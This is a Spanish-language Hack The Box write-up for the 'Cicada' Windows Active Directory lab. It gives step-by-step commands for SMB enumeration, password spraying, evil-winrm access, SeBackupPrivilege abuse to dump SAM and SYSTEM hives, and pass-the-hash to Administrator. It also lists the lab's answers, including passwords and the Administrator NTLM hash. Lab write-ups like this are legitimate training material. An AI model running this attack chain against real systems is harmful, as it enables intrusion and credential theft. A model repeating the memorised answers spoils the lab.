---
title: Writeup cicada - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - cicada
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina cicada en Hack The Box.
keywords:
  - writeup cicada
  - hack the box cicada
  - resolución máquina cicada
  - cicada hack the box
  - htb cicada
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Cicada)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=4IMtfr1jyQU)|[Parte2](https://www.youtube.com/watch?v=RQEKPT4daMA)|[Parte3](https://www.youtube.com/watch?v=ZM48lkClMco)
- 🧠 **Explicación resumida**: 

---

#easy #windows #nmap #ping #smb #impacket-lookupsid #impacket-secretsdump #netexec #cat #cd #mkdir #whoami #evil-winrm #SeBackupPrivilege #ad #activedirectory

-----
# Guided Mode

1)¿Cuál es el nombre de la compartir SMB sin defecto que se puede legible con el acceso de invitados en Cicada?
	HR

2)¿Cuál es el nombre del archivo que se encuentra en la acción de recursos humanos?
	Notice from HR.txt

3)¿Qué cuenta de usuario todavía está utilizando la contraseña predeterminada de la empresa?
	michael.wrightson

4)¿Qué usuario ha dejado su contraseña en metadatos de Active Directory?
	david.orelious

5)¿Cuál es el nombre del script PowerShell ubicado en el desarrollo compartido?
	Backup_script.ps1

6)¿Cuál es la contraseña del usuario Emily.Oscars?
	Q!3@Lp#M6b*7t*Vt

*La pregunta anterior es la flag de user.txt*
8)¿Qué privilegio peligroso ha asociado el usuario de Emily.Oscar con su cuenta?
	SeBackupPrivilege

9)¿Qué es el hash NTLM del usuario del administrador?
	2b87e7c93a3e8a0ea4a581937016f341

------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.35
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.35 -oG allPorts
extractPorts allPorts
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,64265 10.10.11.35 -oN targetTCP
nmap -sU -n -Pn --top-ports 200 10.10.11.35 -oN targetUDP
nmap -sU -sCV -p53,88,123,389 10.10.11.35 -oN udp-scan
```

![[Cicada1.png]]
![[Cicada2.png]]
![[Cicada3.png]]

![[Cicada4.png]]
![[Cicada5.png]]
![[Cicada6.png]]
![[Cicada7.png]]
![[Cicada8.png]]

*TTL:* Maquina Windows
*Puertos Importantes TCP:*
	`445` [[smb]]
	`5985` [[evil-winrm]]
*Puertos UDP:*
	Mucho ruido
*Datos Importantes*
	Encontramos que en LDAP hay un dominio que se llama cicada.htb. Asi que lo vamos a tener que añadir al /etc/hosts

-----
# Añadir dominio a /etc/hosts

Vamos a abrir con [[nvim]] el archivo /etc/hosts con el comando `nvim /etc/hosts`

Y vamos a agregar lo siguiente

```
10.10.11.35 cicada.htb
```

![[Cicada24.png]]
Ahora solamente guardamos y listo

------
# Nos conectamos [[smb]] y obtenemos una contraseña

```smb
smbclient -L //10.10.11.35 -N -p 445                    /Listamos los recursos
smbclient //10.10.11.35/HR -N -p 445                    /Entramos a la carpta HR
get "Notice from HR.txt"                                /Descargamos el archivo
```

![[Cicada10.png]]
![[Cicada9.png]]

Ahora con [[cat]] vamos a abrirlo usando el comando `cat "Notice from HR.txt"`

![[Cicada11.png]]
Obtenemos esta contraseña: Cicada$M6Corpb*@Lp#nZp!8

--------
# [[impacket-lookupsid]]

Asumimos que nos podiamos conectar como guest, cuando nos pudimos conectar a smbclient anteriormente sin proporcionar credenciales. Asi que para enumerar usuarios,grupos, etc vamos a usar la herramienta [[impacket-lookupsid]] con el comando `impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass`


![[Cicada12.png]]
Ahora le vamos a aplicar una regex, para enviar solamente el nombre de los usuarios a un archivo que se va a llamar user.txt

``impacket-lookupsid 'cicada.htb/guest'@10.10.11.35 -no-pass | grep -i "sidtypeuser" | sed 's/.*\\//' | sed 's/ .*//' > users.txt``
	La regex: la primera seria para sacar todo lo que esta antes de la primera \ y la segunda es para sacar todo lo que esta despues del e

![[Cicada13.png]]

----
# Fuerza bruta con [[netexec]]

Vamos a hacer fuerza bruta para encontrar que usuario es el correcto
```
netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-bruteforce
```

![[Cicada15.png]]
Nos da el usuario *michael.wrightson*

Y ahora con las credenciales que tenemos vamos a listar todos los usuario, el netexec nos va a mostrar parámetros adicionales del usuario, como la descripción, membresias de grupo e información de perfil. A diferencia del [[impacket-lookupsid]] que solamente muestra los usuarios
```
netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![[Cicada16.png]]
 Obtenemos las credenciales``david.orelious:aRt$Lp#7t*VQ!3``

----
# Conexion usando credenciales a [[smb]], leemos un script y conexion con [[evil-winrm]]

Nos vamos a conectar usando las credenciales que encontramos con `smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'`

![[Cicada17.png]]
pudimos entrar al /dev y descargamos el backup_script.ps1


Abrimos el archivo *backup_script.ps1* con [[cat]] usando el comando `cat Backup_script.ps1`

![[Cicada18.png]]
Obtenemos estas credenciales:   emily.oscars:Q!3@Lp#M6b*7t*Vt

Y ahora con [[evil-winrm]] nos vamos a conectar usando `evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -P 5985`


![[Cicada19.png]]

-------
# Escalada de privilegios con [[SeBackupPrivilege]]

Usamos [[whoami]] con el comando `whoami /all`

![[Cicada25.png]]
Vemos que tenemos el SeBackupPrivilege

[Usamos este articulo para guiarnos en la escalada](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

Use [[cd]] para meterme en la carpeta raiz del sistema, con [[mkdir]] cree una carpeta y despues con [[reg save]]  para ver las subclaves, entradas y valores especificados del Registro en un archivo especificado.
```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
![[Cicada20.png]]

## Con [[impacket-secretsdump]] vamos a abrir los archivos y que nos dumpee la informacion

```shell
impacket-secretsdump -sam sam -system system LOCAL
```

![[Cicada21.png]]

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```


Nos da el hash *2b87e7c93a3e8a0ea4a581937016f341*


## Conexion a la maquina con [[evil-winrm]]


```
evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341' -P 5985
```


![[Cicada22.png]]
Ya somos administrator y podemos catear las flags
![[Cicada23.png]]
![[Cicada26.png]]

------
# Notas

Cuando encuentro un dominio, no solo sirve para paginas web, tambien sirve para todo lo que es AD

Tenemos el mail support@cicada.htb que no lo usamos para nada

Regedit es el nombre del Editor del Registro de Windows, una herramienta del sistema operativo que permite a los usuarios ver, editar y administrar la base de datos central de configuraciones de Windows

-------
# Creditos

[Writeup de chryb3r](https://medium.com/@chryb3r/cicada-hackthebox-writeup-44ce0910410b)
Writeup Oficial HackTheBox